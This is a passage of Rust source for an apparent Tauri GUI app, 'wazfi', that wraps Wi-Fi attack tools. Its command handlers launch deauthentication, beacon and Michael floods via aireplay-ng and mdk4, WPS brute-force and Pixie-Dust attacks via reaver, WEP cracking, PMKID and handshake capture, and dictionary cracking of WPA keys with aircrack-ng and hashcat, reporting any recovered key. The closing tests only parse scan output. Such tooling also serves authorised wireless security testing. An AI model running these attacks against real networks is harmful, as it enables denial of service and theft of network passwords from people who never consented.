    while let Some(c) = chars.next() {
        if c == '\u{1b}' {
            if chars.peek() == Some(&'[') {
                chars.next();
                while let Some(&n) = chars.peek() {
                    chars.next();
                    if n.is_ascii_alphabetic() {
                        break;
                    }
                }
            } else {
                chars.next();
            }
        } else if c != '\r' {
            out.push(c);
        }
    }
    out
}

fn build_cmd(program: &str, args: &[&str], privileged: bool) -> Command {
    let prog = which(program).unwrap_or_else(|| program.to_string());
    let mut cmd = if privileged && !is_root() {
        let sudo = which("sudo").unwrap_or_else(|| "sudo".into());
        let mut c = Command::new(sudo);
        c.arg("-n").arg(&prog).args(args);
        c
    } else {
        let mut c = Command::new(&prog);
        c.args(args);
        c
    };
    cmd.env("PATH", augmented_path());
    cmd
}

/// Spawn a long-running tool, streaming stdout/stderr as `attack-log` events
/// (ANSI stripped) tagged with the job id; emits `attack-exit` on stdout close.
fn spawn_streamed(
    app: &AppHandle,
    job: &str,
    program: &str,
    args: &[&str],
    privileged: bool,
) -> Result<Child, String> {
    let mut cmd = build_cmd(program, args, privileged);
    cmd.stdout(Stdio::piped()).stderr(Stdio::piped());
    let mut child = cmd
        .spawn()
        .map_err(|e| format!("failed to start {program}: {e}"))?;

    for (pipe, is_out) in [
        (child.stdout.take().map(|p| Box::new(p) as Box<dyn std::io::Read + Send>), true),
        (child.stderr.take().map(|p| Box::new(p) as Box<dyn std::io::Read + Send>), false),
    ] {
        if let Some(p) = pipe {
            let a = app.clone();
            let j = job.to_string();
            std::thread::spawn(move || {
                for line in BufReader::new(p).lines().map_while(Result::ok) {
                    let clean = strip_ansi(&line);
                    if clean.trim().is_empty() {
                        continue;
                    }
                    let _ = a.emit("attack-log", serde_json::json!({ "job": j, "line": clean }));
                }
                if is_out {
                    let _ = a.emit("attack-exit", serde_json::json!({ "job": j }));
                }
            });
        }
    }
    Ok(child)
}

/// Spawn a privileged background tool whose (noisy, redrawing) output we discard.
fn spawn_quiet_priv(program: &str, args: &[&str]) -> Result<Child, String> {
    build_cmd(program, args, true)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| format!("failed to start {program}: {e}"))
}

/// Does the capture file contain at least one captured handshake?
/// aircrack-ng lists each network's "(N handshake)" count; reading a file is
/// unprivileged.
fn cap_has_handshake(cap: &str) -> bool {
    let prog = which("aircrack-ng").unwrap_or_else(|| "aircrack-ng".into());
    let out = Command::new(prog)
        .arg(cap)
        .env("PATH", augmented_path())
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .output();
    if let Ok(o) = out {
        let s = String::from_utf8_lossy(&o.stdout);
        for seg in s.split('(') {
            if seg.contains("handshake") {
                let n: u32 = seg
                    .chars()
                    .take_while(|c| c.is_ascii_digit())
                    .collect::<String>()
                    .parse()
                    .unwrap_or(0);
                if n >= 1 {
                    return true;
                }
            }
        }
    }
    false
}

/// Generic launcher for single-process radio attacks (DoS, WPS, WEP, PMKID).
/// Each `kind` maps to a tool + args; the job id is the kind, so the UI can
/// show Stop and stream output.
#[tauri::command]
fn run_attack(
    app: AppHandle,
    state: State<AttackState>,
    kind: String,
    iface: String,
    bssid: String,
    channel: u32,
    essid: String,
) -> Result<(), String> {
    let ch = channel.to_string();

    // PMKID capture: hcxdumptool manages the interface itself and writes a
    // pcapng we can later convert/crack.
    if kind == "pmkid" {
        which("hcxdumptool").ok_or_else(|| "hcxdumptool not installed".to_string())?;
        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
        let dir = format!("{home}/wazfi-captures");
        std::fs::create_dir_all(&dir).ok();
        let ts = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);
        let out = format!("{dir}/pmkid_{ts}.pcapng");
        let _ = sudo_sh(&["nmcli", "dev", "set", &iface, "managed", "no"]);
        let args = vec!["-i".to_string(), iface.clone(), "-w".to_string(), out.clone()];
        let args_ref: Vec<&str> = args.iter().map(String::as_str).collect();
        let _ = app.emit(
            "attack-log",
            serde_json::json!({ "job": "pmkid", "line": format!("hcxdumptool {} → {}", args_ref.join(" "), out) }),
        );
        let child = spawn_streamed(&app, "pmkid", "hcxdumptool", &args_ref, true)?;
        state.0.lock().unwrap().insert("pmkid".into(), child);
        return Ok(());
    }

    let (tool, args): (&str, Vec<String>) = match kind.as_str() {
        "deauth_aireplay" => (
            "aireplay-ng",
            vec!["--deauth".into(), "0".into(), "-a".into(), bssid.clone(), iface.clone()],
        ),
        "deauth_mdk4" => (
            "mdk4",
            vec![iface.clone(), "d".into(), "-B".into(), bssid.clone(), "-c".into(), ch.clone()],
        ),
        "beacon" => ("mdk4", vec![iface.clone(), "b".into(), "-c".into(), ch.clone()]),
        "michael" => ("mdk4", vec![iface.clone(), "m".into(), "-t".into(), bssid.clone()]),
        "wids" => {
            let mut a = vec![iface.clone(), "w".into()];
            if !essid.is_empty() {
                a.push("-e".into());
                a.push(essid.clone());
            }
            ("mdk4", a)
        }
        "wps_scan" => ("wash", vec!["-i".into(), iface.clone()]),
        "wps_pixie" => (
            "reaver",
            vec!["-i".into(), iface.clone(), "-b".into(), bssid.clone(), "-c".into(), ch.clone(), "-K".into(), "1".into(), "-vv".into()],
        ),
        "wps_bruteforce" => (
            "reaver",
            vec!["-i".into(), iface.clone(), "-b".into(), bssid.clone(), "-c".into(), ch.clone(), "-vv".into()],
        ),
        "wps_nullpin" => (
            "reaver",
            vec!["-i".into(), iface.clone(), "-b".into(), bssid.clone(), "-c".into(), ch.clone(), "-p".into(), "".into(), "-vv".into()],
        ),
        "wep_besside" => ("besside-ng", vec!["-b".into(), bssid.clone(), iface.clone()]),
        other => return Err(format!("attack '{other}' is not wired")),
    };

    which(tool).ok_or_else(|| format!("{tool} not installed"))?;
    let needs_bssid = !matches!(kind.as_str(), "beacon" | "wids" | "wps_scan");
    if needs_bssid && bssid.is_empty() {
        return Err("select a target network first".into());
    }
    ensure_monitor(&iface, channel)?;
    let args_ref: Vec<&str> = args.iter().map(String::as_str).collect();
    let _ = app.emit(
        "attack-log",
        serde_json::json!({ "job": kind, "line": format!("{tool} {}", args_ref.join(" ")) }),
    );
    let child = spawn_streamed(&app, &kind, tool, &args_ref, true)?;
    state.0.lock().unwrap().insert(kind.clone(), child);
    Ok(())
}

#[tauri::command]
fn start_capture(
    app: AppHandle,
    state: State<AttackState>,
    iface: String,
    bssid: String,
    channel: u32,
) -> Result<String, String> {
    ensure_monitor(&iface, channel)?;
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    let dir = format!("{home}/wazfi-captures");
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let prefix = format!("{dir}/hs_{}_{ts}", bssid.replace(':', ""));
    let cap = format!("{prefix}-01.cap");
    let ch = channel.to_string();

    let _ = app.emit(
        "attack-log",
        serde_json::json!({ "job": "capture", "line": format!("airodump-ng -c {channel} --bssid {bssid} -w {prefix} {iface}") }),
    );
    // airodump-ng redraws a full-screen table with escape codes, so we discard
    // its output and report concise status from the capture-file watcher.
    let child = spawn_quiet_priv(
        "airodump-ng",
        &["-c", &ch, "--bssid", &bssid, "-w", &prefix, &iface],
    )?;
    state.0.lock().unwrap().insert("capture".into(), child);

    // Watch the capture file for a handshake; report progress periodically.
    let a = app.clone();
    let capf = cap.clone();
    std::thread::spawn(move || {
        for tick in 1..=180u32 {
            std::thread::sleep(Duration::from_secs(4));
            if std::path::Path::new(&capf).exists() && cap_has_handshake(&capf) {
                let _ = a.emit(
                    "attack-log",
                    serde_json::json!({ "job": "capture", "line": format!("4-way handshake captured → {capf}") }),
                );
                let _ = a.emit("handshake-captured", serde_json::json!({ "file": capf }));
                let _ = a.emit("attack-exit", serde_json::json!({ "job": "capture" }));
                kill_attack_tools(); // auto-stop airodump
                break;
            }
            if tick % 4 == 0 {
                let _ = a.emit(
                    "attack-log",
                    serde_json::json!({ "job": "capture", "line": "capturing… waiting for a handshake (run Deauth to force a client to reconnect)" }),
                );
            }
        }
    });
    Ok(cap)
}

#[tauri::command]
fn stop_attack(state: State<AttackState>, job: String) -> Result<(), String> {
    if let Some(mut child) = state.0.lock().unwrap().remove(&job) {
        let _ = child.kill();
        let _ = child.wait();
    }
    // The real tool may be a grandchild of sudo/bash; signal it by name too.
    // The crack job can be either aircrack-ng (handshake) or hashcat (PMKID).
    let tools: &[&str] = match job.as_str() {
        "deauth" | "deauth_aireplay" => &["aireplay-ng"],
        "capture" => &["airodump-ng"],
        "wordlist" => &["crunch"],
        "crack" => &["aircrack-ng", "hashcat"],
        "deauth_mdk4" | "beacon" | "michael" | "wids" => &["mdk4"],
        "wps_scan" => &["wash"],
        "wps_pixie" | "wps_bruteforce" | "wps_nullpin" => &["reaver"],
        "wep_besside" => &["besside-ng"],
        "pmkid" => &["hcxdumptool"],
        _ => &[],
    };
    for tool in tools {
        let _ = sudo_sh(&["pkill", "-TERM", "-x", tool]);
    }
    Ok(())
}

// --------------------------------------------------------------------------- //
// Captures + wordlist generation
// --------------------------------------------------------------------------- //

#[derive(Serialize)]
pub struct CaptureFile {
    name: String,
    path: String,
    size: u64,
    modified: u64,
    /// true when the file holds something crackable (a 4-way handshake for
    /// `.cap`, or a PMKID/EAPOL for `.pcapng`/`.pcap`).
    has_handshake: bool,
    /// "handshake" (aircrack-ng / `.cap`) or "pmkid" (hashcat / `.pcapng`).
    kind: String,
}

fn captures_dir() -> String {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
    format!("{home}/wazfi-captures")
}

/// Convert an hcxdumptool `.pcapng`/`.pcap` capture into a hashcat mode-22000
/// hash file, returning its path when it contains at least one PMKID/EAPOL.
/// The hash file is written alongside the capture as `<cap>.22000`.
fn convert_pmkid(cap: &str) -> Option<String> {
    let tool = which("hcxpcapngtool")?;
    let out = format!("{cap}.22000");
    let _ = std::fs::remove_file(&out);
    let ok = Command::new(tool)
        .arg("-o")
        .arg(&out)
        .arg(cap)
        .env("PATH", augmented_path())
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false);
    let has = ok
        && std::fs::metadata(&out)
            .map(|m| m.len() > 0)
            .unwrap_or(false);
    if has {
        Some(out)
    } else {
        let _ = std::fs::remove_file(&out);
        None
    }
}

/// Does a pcapng/pcap capture contain a crackable PMKID/EAPOL? Checked by a
/// throwaway conversion into a temp file (reading a capture is unprivileged).
fn pcapng_crackable(cap: &str) -> bool {
    let tool = match which("hcxpcapngtool") {
        Some(t) => t,
        None => return false,
    };
    let name = std::path::Path::new(cap)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("cap");
    let tmp = std::env::temp_dir().join(format!("wazfi_chk_{name}.22000"));
    let _ = std::fs::remove_file(&tmp);
    let ok = Command::new(tool)
        .arg("-o")
        .arg(&tmp)
        .arg(cap)
        .env("PATH", augmented_path())
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false);
    let has = ok
        && std::fs::metadata(&tmp)
            .map(|m| m.len() > 0)
            .unwrap_or(false);
    let _ = std::fs::remove_file(&tmp);
    has
}

#[tauri::command]
fn list_captures() -> Vec<CaptureFile> {
    let dir = captures_dir();
    let mut out = Vec::new();
    if let Ok(rd) = std::fs::read_dir(&dir) {
        for e in rd.flatten() {
            let p = e.path();
            let kind = match p.extension().and_then(|x| x.to_str()) {
                Some("cap") => "handshake",
                Some("pcapng") | Some("pcap") => "pmkid",
                _ => continue,
            };
            let meta = e.metadata().ok();
            let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
            let modified = meta
                .and_then(|m| m.modified().ok())
                .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                .map(|d| d.as_secs())
                .unwrap_or(0);
            let path = p.to_string_lossy().to_string();
            let has_handshake = if kind == "pmkid" {
                pcapng_crackable(&path)
            } else {
                cap_has_handshake(&path)
            };
            out.push(CaptureFile {
                name: p.file_name().unwrap_or_default().to_string_lossy().to_string(),
                has_handshake,
                kind: kind.to_string(),
                path,
                size,
                modified,
            });
        }
    }
    out.sort_by(|a, b| b.modified.cmp(&a.modified));
    out
}

#[tauri::command]
fn delete_capture(path: String) -> Result<(), String> {
    // Only allow deleting inside our captures dir.
    if !path.starts_with(&captures_dir()) {
        return Err("refusing to delete outside the captures folder".into());
    }
    // PMKID captures: remove the pcapng/pcap and its derived hashcat file.
    if path.ends_with(".pcapng") || path.ends_with(".pcap") {
        let _ = std::fs::remove_file(&path);
        let _ = std::fs::remove_file(format!("{path}.22000"));
        return Ok(());
    }
    // airodump writes companion files (.csv/.kismet/.netxml/.log) — remove them too.
    let stem = path.trim_end_matches(".cap");
    for ext in [".cap", ".csv", ".kismet.csv", ".kismet.netxml", ".log.csv"] {
        let _ = std::fs::remove_file(format!("{stem}{ext}"));
    }
    Ok(())
}

/// Generate a wordlist with crunch. Runs as the `wordlist` job so it streams to
/// the console and can be stopped. Returns the output path.
#[tauri::command]
fn generate_wordlist(
    app: AppHandle,
    state: State<AttackState>,
    charset: String,
    min: u32,
    max: u32,
    pattern: String,
    name: String,
) -> Result<String, String> {
    which("crunch").ok_or_else(|| "crunch not installed (apt install crunch)".to_string())?;
    if min == 0 || max == 0 || max < min || max > 20 {
        return Err("invalid length range (1..=20, max ≥ min)".into());
    }
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
    let dir = format!("{home}/wazfi-wordlists");
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let safe: String = name
        .chars()
        .filter(|c| c.is_alphanumeric() || *c == '-' || *c == '_')
        .collect();
    let safe = if safe.is_empty() { "wordlist".to_string() } else { safe };
    let out = format!("{dir}/{safe}.txt");

    let min_s = min.to_string();
    let max_s = max.to_string();
    let mut args: Vec<String> = vec![min_s, max_s];
    if !charset.trim().is_empty() {
        args.push(charset);
    }
    if !pattern.trim().is_empty() {
        args.push("-t".into());
        args.push(pattern);
    }
    let args_ref: Vec<&str> = args.iter().map(String::as_str).collect();
    let _ = app.emit(
        "attack-log",
        serde_json::json!({ "job": "wordlist", "line": format!("crunch {} > {}", args_ref.join(" "), out) }),
    );

    // Redirect crunch's stdout to the file ourselves instead of using `-o`
    // (crunch's -o rename step is buggy); progress comes on stderr.
    let f = std::fs::File::create(&out).map_err(|e| format!("cannot create {out}: {e}"))?;
    let mut cmd = build_cmd("crunch", &args_ref, false);
    cmd.stdout(Stdio::from(f)).stderr(Stdio::piped());
    let mut child = cmd
        .spawn()
        .map_err(|e| format!("failed to start crunch: {e}"))?;
    if let Some(err) = child.stderr.take() {
        let a = app.clone();
        std::thread::spawn(move || {
            for line in BufReader::new(err).lines().map_while(Result::ok) {
                let clean = strip_ansi(&line);
                if !clean.trim().is_empty() {
                    let _ = a.emit("attack-log", serde_json::json!({ "job": "wordlist", "line": clean }));
                }
            }
            let _ = a.emit("attack-exit", serde_json::json!({ "job": "wordlist" }));
        });
    }
    state.0.lock().unwrap().insert("wordlist".into(), child);
    Ok(out)
}

#[derive(Serialize)]
pub struct WordlistFile {
    name: String,
    path: String,
    size: u64,
}

#[tauri::command]
fn list_wordlists() -> Vec<WordlistFile> {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
    let mut out = Vec::new();
    for dir in [format!("{home}/wazfi-wordlists"), "/usr/share/wordlists".to_string()] {
        if let Ok(rd) = std::fs::read_dir(&dir) {
            for e in rd.flatten() {
                let p = e.path();
                if p.is_file() {
                    out.push(WordlistFile {
                        name: p.file_name().unwrap_or_default().to_string_lossy().to_string(),
                        path: p.to_string_lossy().to_string(),
                        size: e.metadata().map(|m| m.len()).unwrap_or(0),
                    });
                }
            }
        }
    }
    out
}

/// Spawn hashcat (mode 22000) via bash as the "crack" job. Streams progress as
/// `attack-log`; the password is written by hashcat to `outfile`
/// (`--outfile-format 2` = plaintext only). When hashcat's stdout closes we
/// read `outfile` and emit a "KEY FOUND!" line (so the UI's existing matcher
/// picks it up) or report that the wordlist was exhausted, then `attack-exit`.
fn spawn_hashcat_crack(
    app: &AppHandle,
    bash_line: &str,
    outfile: String,
) -> Result<Child, String> {
    let mut cmd = build_cmd("bash", &["-c", bash_line], false);
    cmd.stdout(Stdio::piped()).stderr(Stdio::piped());
    let mut child = cmd
        .spawn()
        .map_err(|e| format!("failed to start hashcat: {e}"))?;

    for (pipe, is_out) in [
        (child.stdout.take().map(|p| Box::new(p) as Box<dyn std::io::Read + Send>), true),
        (child.stderr.take().map(|p| Box::new(p) as Box<dyn std::io::Read + Send>), false),
    ] {
        if let Some(p) = pipe {
            let a = app.clone();
            let of = outfile.clone();
            std::thread::spawn(move || {
                for line in BufReader::new(p).lines().map_while(Result::ok) {
                    let clean = strip_ansi(&line);
                    if clean.trim().is_empty() {
                        continue;
                    }
                    let _ = a.emit(
                        "attack-log",
                        serde_json::json!({ "job": "crack", "line": clean }),
                    );
                }
                if is_out {
                    // hashcat has exited — the plaintext (if any) is in outfile.
                    let key = std::fs::read_to_string(&of)
                        .ok()
                        .and_then(|c| {
                            c.lines()
                                .map(str::trim)
                                .find(|l| !l.is_empty())
                                .map(str::to_string)
                        });
                    let line = match key {
                        Some(pw) => format!("KEY FOUND! [ {pw} ]"),
                        None => "hashcat finished — key not found (wordlist exhausted)".to_string(),
                    };
                    let _ = a.emit(
                        "attack-log",
                        serde_json::json!({ "job": "crack", "line": line }),
                    );
                    let _ = a.emit("attack-exit", serde_json::json!({ "job": "crack" }));
                }
            });
        }
    }
    Ok(child)
}

/// Dictionary attack against a handshake (`.cap`, aircrack-ng) or a PMKID/EAPOL
/// capture (`.pcapng`/`.pcap`, converted with hcxpcapngtool then cracked with
/// hashcat mode 22000). Runs as the "crack" job and streams output; the UI
/// highlights the "KEY FOUND!" line.
#[tauri::command]
fn start_crack(
    app: AppHandle,
    state: State<AttackState>,
    cap: String,
    wordlist: String,
) -> Result<(), String> {
    if !std::path::Path::new(&cap).exists() {
        return Err(format!("capture not found: {cap}"));
    }
    if !std::path::Path::new(&wordlist).exists() {
        return Err(format!("wordlist not found: {wordlist}"));
    }

    let shq = |s: &str| format!("'{}'", s.replace('\'', "'\\''"));

    // PMKID / EAPOL capture → hcxpcapngtool + hashcat (mode 22000).
    if cap.ends_with(".pcapng") || cap.ends_with(".pcap") {
        which("hcxpcapngtool")
            .ok_or_else(|| "hcxpcapngtool not installed (apt install hcxtools)".to_string())?;
        which("hashcat").ok_or_else(|| "hashcat not installed (apt install hashcat)".to_string())?;
        let hc = convert_pmkid(&cap)
            .ok_or_else(|| "no PMKID/EAPOL message found in this capture".to_string())?;
        let outfile = format!("{hc}.cracked");
        let _ = std::fs::remove_file(&outfile);

        // --outfile-format 2 = plaintext only; --potfile-disable so a previous
        // run doesn't short-circuit and skip writing the outfile.
        let hc_opts = format!(
            "-m 22000 -a 0 --potfile-disable --outfile-format 2 -o {} --status --status-timer 10 {}",
            shq(&outfile),
            shq(&hc)
        );
        let bash_line = if wordlist.ends_with(".gz") {
            // hashcat can't read gzip; feed candidates on stdin via zcat.
            format!("zcat {} | hashcat {}", shq(&wordlist), hc_opts)
        } else {
            format!("hashcat {} {}", hc_opts, shq(&wordlist))
        };
        let _ = app.emit(
            "attack-log",
            serde_json::json!({ "job": "crack", "line": bash_line.clone() }),
        );
        let child = spawn_hashcat_crack(&app, &bash_line, outfile)?;
        state.0.lock().unwrap().insert("crack".into(), child);
        return Ok(());
    }

    which("aircrack-ng").ok_or_else(|| "aircrack-ng not installed".to_string())?;
    // Derive the BSSID from our capture filename (hs_<12 hex>_<ts>-01.cap) so
    // aircrack doesn't prompt for a target.
    let bssid = std::path::Path::new(&cap)
        .file_name()
        .and_then(|f| f.to_str())
        .and_then(|n| n.strip_prefix("hs_"))
        .and_then(|r| r.split('_').next())
        .filter(|m| m.len() == 12 && m.chars().all(|c| c.is_ascii_hexdigit()))
        .map(|m| {
            let mut s = String::new();
            for (i, c) in m.chars().enumerate() {
                if i > 0 && i % 2 == 0 {
                    s.push(':');
                }
                s.push(c);
            }
            s.to_uppercase()
        });

    let bssid_flag = bssid.as_ref().map(|b| format!("-b {b} ")).unwrap_or_default();

    let child = if wordlist.ends_with(".gz") {
        // aircrack can't read gzip directly — stream it through zcat.
        let inner = format!(
            "zcat {} | aircrack-ng -w - {}{}",
            shq(&wordlist),
            bssid_flag,
            shq(&cap)
        );
        let _ = app.emit(
            "attack-log",
            serde_json::json!({ "job": "crack", "line": inner.clone() }),
        );
        spawn_streamed(&app, "crack", "bash", &["-c", inner.as_str()], false)?
    } else {
        let mut args: Vec<String> = vec!["-w".into(), wordlist];
        if let Some(b) = &bssid {
            args.push("-b".into());
            args.push(b.clone());
        }
        args.push(cap);
        let args_ref: Vec<&str> = args.iter().map(String::as_str).collect();
        let _ = app.emit(
            "attack-log",
            serde_json::json!({ "job": "crack", "line": format!("aircrack-ng {}", args_ref.join(" ")) }),
        );
        spawn_streamed(&app, "crack", "aircrack-ng", &args_ref, false)?
    };
    state.0.lock().unwrap().insert("crack".into(), child);
    Ok(())
}

#[tauri::command]
fn attack_status(state: State<AttackState>) -> Vec<String> {
    let mut map = state.0.lock().unwrap();
    let mut running = Vec::new();
    map.retain(|k, child| match child.try_wait() {
        Ok(Some(_)) => false,
        _ => {
            running.push(k.clone());
            true
        }
    });
    running
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_dialog::init())
        .manage(AttackState::default())
        .invoke_handler(tauri::generate_handler![
            get_system_info,
            list_interfaces,
            check_tools,
            set_monitor_mode,
            scan_networks,
            detect_usb_wifi,
            check_prereqs,
            install_tools,
            run_attack,
            start_capture,
            stop_attack,
            attack_status,
            list_captures,
            delete_capture,
            generate_wordlist,
            list_wordlists,
            start_crack
        ])
        .build(tauri::generate_context!())
        .expect("error while building tauri application")
        .run(|_app, event| {
            // Don't leave airodump/aireplay running after the app closes.
            if let tauri::RunEvent::Exit = event {
                kill_attack_tools();
            }
        });
}

#[cfg(test)]
mod tests {
    use super::*;

    // Mirrors real `system_profiler SPAirPortDataType` indentation:
    // 10 spaces = section header, 12 = network name, 14 = field.
    const SAMPLE: &str = "\
      Interfaces:
        en0:
          Card Type: Wi-Fi  (0x14E4, 0x4388)
          Status: Connected
          Current Network Information:
            <redacted>:
              PHY Mode: 802.11ac
              Channel: 36 (5GHz, 80MHz)
              Network Type: Infrastructure
              Security: WPA2 Enterprise
              Signal / Noise: -64 dBm / -94 dBm
          Other Local Wi-Fi Networks:
            <redacted>:
              PHY Mode: 802.11b/g/n/ac
              Channel: 7 (2GHz, 20MHz)
              Network Type: Infrastructure
              Security: WPA3 Personal
            <redacted>:
              PHY Mode: 802.11a/n/ac
              Channel: 36 (5GHz, 80MHz)
              Network Type: Infrastructure
              Security: None
            <redacted>:
              PHY Mode: 802.11a/n/ac/ax
              Channel: 36 (5GHz, 80MHz)
              Network Type: Infrastructure
              Security: WPA2/WPA3 Personal
            HomeNet:
              PHY Mode: 802.11b/g/n
              Channel: 1 (2GHz, 20MHz)
              Network Type: Infrastructure
              Security: WPA2 Personal
        awdl0:
          MAC Address: 1a:2e:08:91:34:ee
";

    #[test]
    fn parses_macos_scan() {
        let nets = parse_macos_scan(SAMPLE);
        // connected + 4 others
        assert_eq!(nets.len(), 5, "expected 5 networks, got {}", nets.len());

        // connected network
        assert_eq!(nets[0].channel, 36);
        assert_eq!(nets[0].band, "5GHz");
        assert_eq!(nets[0].encryption, "WPA2-EAP");
        assert_eq!(nets[0].power, -64);
        assert_eq!(nets[0].essid, "<hidden>");

        // first "other": WPA3 personal, no signal -> default -100
        assert_eq!(nets[1].channel, 7);
        assert_eq!(nets[1].band, "2.4GHz");
        assert_eq!(nets[1].encryption, "WPA3");
        assert_eq!(nets[1].power, -100);

        // open network
        assert_eq!(nets[2].encryption, "OPN");

        // mixed WPA2/WPA3
        assert_eq!(nets[3].encryption, "WPA2/WPA3");

        // named (non-redacted) network keeps its SSID
        assert_eq!(nets[4].essid, "HomeNet");
        assert_eq!(nets[4].encryption, "WPA2");

        // ids are unique
        let mut ids: Vec<&str> = nets.iter().map(|n| n.id.as_str()).collect();
        ids.sort();
        ids.dedup();
        assert_eq!(ids.len(), 5, "ids must be unique");
    }

    #[cfg(target_os = "macos")]
    #[test]
    #[ignore = "reads real USB devices; run with --ignored"]
    fn live_usb_wifi() {
        let devs = detect_usb_wifi_impl();
        println!("detected {} USB Wi-Fi adapter(s):", devs.len());
        for d in &devs {
            println!(
                "  {} [{}:{}] chipset={} linux={}",
                d.name, d.vendor_id, d.product_id, d.chipset, d.linux_driver
            );
        }
    }

    #[cfg(target_os = "macos")]
    #[test]
    #[ignore = "hits the real system_profiler; run with --ignored"]
    fn live_scan_smoke() {
        let nets = scan_impl("en0").expect("live scan should succeed");
        assert!(!nets.is_empty(), "live scan returned no networks");
        for n in &nets {
            println!(
                "ch{:<3} {:<10} {:>4}dBm {}",
                n.channel, n.encryption, n.power, n.essid
            );
        }
    }

    #[test]
    fn security_mapping() {
        assert_eq!(normalize_security("None"), "OPN");
        assert_eq!(normalize_security("WPA3 Personal"), "WPA3");
        assert_eq!(normalize_security("WPA2 Enterprise"), "WPA2-EAP");
        assert_eq!(normalize_security("WPA2/WPA3 Personal"), "WPA2/WPA3");
        assert_eq!(normalize_security("WPA2 Personal"), "WPA2");
    }
}
